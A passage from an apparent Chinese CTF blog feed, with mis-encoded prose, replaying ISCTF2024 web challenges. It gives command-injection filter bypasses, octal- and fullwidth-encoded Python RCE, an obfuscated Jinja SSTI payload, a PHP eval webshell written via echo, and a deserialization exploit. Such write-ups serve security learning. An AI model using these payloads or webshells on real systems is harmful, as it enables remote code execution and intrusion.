class="hljs-string">&quot;num&quot;</span>)<br>        script = <span class="hljs-string">f&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">print(eval(&quot;<span class="hljs-subst">&#123;num&#125;</span>&quot;))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(script)<br>        <span class="hljs-keyword">if</span> waf(num):<br>            <span class="hljs-keyword">try</span>:<br>                result_output = <span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="hljs-string">&#x27;w+&#x27;</span>, suffix=<span class="hljs-string">&#x27;.py&#x27;</span>, delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> temp_script:<br>                    temp_script.write(script)<br>                    temp_script_path = temp_script.name<br><br>                result = subprocess.run([<span class="hljs-string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>                os.remove(temp_script_path)<br><br>                result_output = result.stdout <span class="hljs-keyword">if</span> result.returncode == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> result.stderr<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><br>                result_output = <span class="hljs-built_in">str</span>(e)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, result=result_output)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, result=<span class="hljs-string">&quot;è‡­çš®ï¼ä½ æƒ³å¹²ä»€ä¹ˆï¼ï¼&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, result=<span class="hljs-string">&#x27;è¯•è¯•å‘—&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">30002</span>)<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ï¼Œåˆ©ç”¨å…«è¿›åˆ¶è¿›è¡Œrceï¼Œç¼–ç è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¾“å…¥è¦ç¼–ç çš„å­—ç¬¦ä¸²: &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;\\<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(c):03o&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> user_input))<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust">payloadï¼š__import__(<span class="hljs-symbol">&#x27;o</span>s<span class="hljs-string">&#x27;).popen(&#x27;</span>cat /flag<span class="hljs-string">&#x27;).read()</span><br><span class="hljs-string">ç¼–ç åï¼š<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>51<span class="hljs-char escape_">\1</span>55<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>62<span class="hljs-char escape_">\1</span>64<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>63<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\0</span>51<span class="hljs-char escape_">\0</span>56<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>45<span class="hljs-char escape_">\1</span>56<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\1</span>43<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>64<span class="hljs-char escape_">\0</span>40<span class="hljs-char escape_">\0</span>57<span class="hljs-char escape_">\1</span>46<span class="hljs-char escape_">\1</span>54<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>47<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\0</span>51<span class="hljs-char escape_">\0</span>56<span class="hljs-char escape_">\1</span>62<span class="hljs-char escape_">\1</span>45<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>44<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>51</span><br></code></pre></td></tr></table></figure><p>å®˜æ–¹wpè¿˜æœ‰ä¸€ç§åšæ³•ï¼šä½¿ç”¨å…¨è§’å­—ç¬¦å’Œå­—ç¬¦æ‹¼æ¥è¿›è¡Œrce</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_</span>ï¼¿ï½‰ï½ï½ï½ï½’ï½”_ï¼¿(ï½ƒï½ˆï½’(<span class="hljs-number">111</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">115</span>)).ï½“ï½™ï½“ï½”ï½…ï½(ï½ƒï½ˆï½’(<span class="hljs-number">99</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">97</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">116</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">32</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">47</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">102</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">108</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">97</span>)+ï½ƒï½ˆï½’(<span class="hljs-number">103</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2024_WEBå¤ç°</title>
    <link href="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-comment">#ä¸€å¥è¯æœ¨é©¬ï¼Œç¥ç¥åˆå¥‡å¥‡</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$call</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>    <span class="hljs-variable">$dangerous_commands</span> = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$command</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$command</span>/i&quot;</span>, <span class="hljs-variable">$call</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿™äº›ä¸ªå±é™©å‡½æ•°å¯ä¸å…´ä½¿å•Š&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$call</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>é¢˜ç›®è¿‡æ»¤äº†ä¸€äº›è¯»æ–‡ä»¶çš„å‘½ä»¤</p><p>å…ˆls &#x2F;ï¼Œå‘ç°&#x2F;f14gç›®å½•</p><p>æ‹¿flagçš„è¯ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸€äº›payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">J=ca&#x27;&#x27;t /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=strings /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=tar -czf flag.tar.gz /f14g# å°†/f14gæ–‡ä»¶æ‰“åŒ…ä¸ºflag.tar.gzæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½å³å¯</span><br><span class="language-xml"></span><br><span class="language-xml">J=cp /f14g flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">J=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 1.php# é¢˜ç›®æç¤ºçš„å†™é©¬</span><br><span class="language-xml"></span><br><span class="language-xml">Â·Â·Â·Â·Â·Â·</span><br></code></pre></td></tr></table></figure><h2 id="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"><a href="#25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š" class="headerlink" title="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"></a>25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š</h2><p>bpæŠ“åŒ…</p><p>1ã€â€œä½ ä¸æ˜¯çƒ¤pï¼è¦æ˜¯Project Sekaiçš„å®¢æˆ·ç«¯è¯·æ±‚æ‰èƒ½åŠ å…¥ç”Ÿæ—¥ä¼šâ€ &#x3D;&#x3D;&gt; æŠŠuaå¤´æ”¹ä¸ºâ€œProject Sekaiâ€</p><p>2ã€â€œåªèƒ½ä»æœ¬åœ°æ¥ï¼â€ &#x3D;&#x3D;&gt; åŠ ä¸€ä¸ªxffå¤´â€œX-Forwarded-For: 127.0.0.1â€</p><p>3ã€â€œä½ ä¼¼ä¹æ²¡åœ¨æ­£ç¡®çš„æ—¶é—´æ¥â€¦â€</p><p>åŠ ä¸€ä¸ªDateå¤´ï¼Œå…ˆéšä¾¿åŠ ä¸€ä¸ªæ—¶é—´ï¼Œæç¤ºâ€œæ—¥æœŸæ ¼å¼ä¸å¯¹å“¦ï¼Œè¦RFC 822æ ¼å¼â€</p><blockquote><p>RFC 822æ ¼å¼æ—¶é—´æ˜¯ä¸€ç§æ ‡å¿—åŒ–çš„æ—¶é—´è¡¨ç¤ºæ–¹æ³•ï¼Œå¸¸ç”¨äºç”µå­é‚®ä»¶å’Œäº’è”ç½‘åè®®ä¸­ï¼Œå®ƒçš„æ ¼å¼ä¸ºï¼šDay, DD Mon YYYY HH:MM:SS GMTï¼Œä¾‹å¦‚ï¼šMon, 30 Nov 2020 01:07:30 GMT</p></blockquote><p>æŒ‰ç…§æ ¼å¼ä¿®æ”¹Dateå¤´çš„å€¼ï¼Œæç¤ºå¤ªæ—©äº†</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/251.png"></p><p>æ£€ç´¢ä¸€ä¸‹â€œ25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼šâ€ï¼Œå‘ç°æ—¶é—´â€œ2024å¹´8æœˆ27æ—¥â€ï¼Œä¿®æ”¹Dateå¤´ï¼Œæ‹¿åˆ°flag</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/252.png"></p><h2 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader"></a>UP!UPloader</h2><p>å…ˆéšä¾¿ä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæç¤ºinclude.php</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/up1.png"></p><p>è®¿é—®include.phpï¼Œæç¤ºæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨ä¼ªåè®®è¯»å‡ºupload.php</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</p></blockquote><p>è§£ç åï¼Œå¾—åˆ°upload.phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_FILENAME);<br>    <span class="hljs-variable">$dir_name</span> = <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$upload_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$upload_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$upload_dir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dir_name</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼ä¸è¿‡æ–‡ä»¶è·¯å¾„å¯ä¸å¥½æ‰¾å‘€~ä»€ä¹ˆï¼Ÿä»€ä¹ˆinclude.phpï¼Ÿæˆ‘ä¸çŸ¥é“å•Šã€‚&quot;</span> ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶å­˜å‚¨å¤±è´¥ï¼ŒæœªçŸ¥åŸå› ......&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ åè¢«æ”¾åœ¨&#x2F;uploadsç›®å½•ä¸‹ï¼Œä¸”æ–‡ä»¶è¢«ä¿å­˜ä¸ºmd5(åŸæ–‡ä»¶å.æ‹“å±•å)+æ‹“å±•å</p><p>ä¸Šä¼ 1.phpï¼Œå…¶ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ å1.phpè¢«ä¿å­˜ä¸ºf3b94e88bd1bd325af6f62828c8785dd.phpï¼Œç„¶åè¿é©¬ï¼Œæ‹¿flagï¼Œflagåœ¨ç¯å¢ƒå˜é‡ä¸­</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Blocked by security filter!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€äº›å‘½ä»¤å’Œå‡½æ•°ï¼Œç›´æ¥è´´ä¸€äº›payloadå§</p><blockquote><p>cmd&#x3D;passthru(â€˜ca\t${IFS}&#x2F;f*â€™);</p><p>cmd&#x3D;passthru(â€˜strings${IFS}&#x2F;f*â€™);</p><p>cmd&#x3D;include$_GET[â€˜aâ€™];&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag</p><p>cmd&#x3D;(sy.(st).em)(hex2bin(â€˜636174202f662aâ€™));</p><p>Â·Â·Â·Â·Â·Â·</p></blockquote><h2 id="ezSSTI"><a href="#ezSSTI" class="headerlink" title="ezSSTI"></a>ezSSTI</h2><p>fenjingä¸€æŠŠæ¢­</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/ezssti.png"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0075</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0076</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0063</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0020</span><span class="hljs-character">\u002f</span><span class="hljs-character">\u0066</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0064</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0029</span>&#x27;))%&#125;<br></code></pre></td></tr></table></figure><h2 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize"></a>ezserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You can&#x27;t directly access the flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;isAdmin) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, admin! Here&#x27;s your flag: &quot;</span> . (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>())-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$this</span>-&gt;username) . <span class="hljs-string">&quot;!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> <span class="hljs-keyword">instanceof</span> User) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid object!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ååºåˆ—åŒ–è§¦å‘Userç±»ä¸­çš„__wakeup()é­”æœ¯æ–¹æ³•ï¼Œæ‰“å°å‡ºflag</p><p>åºåˆ—åŒ–exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = True;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ 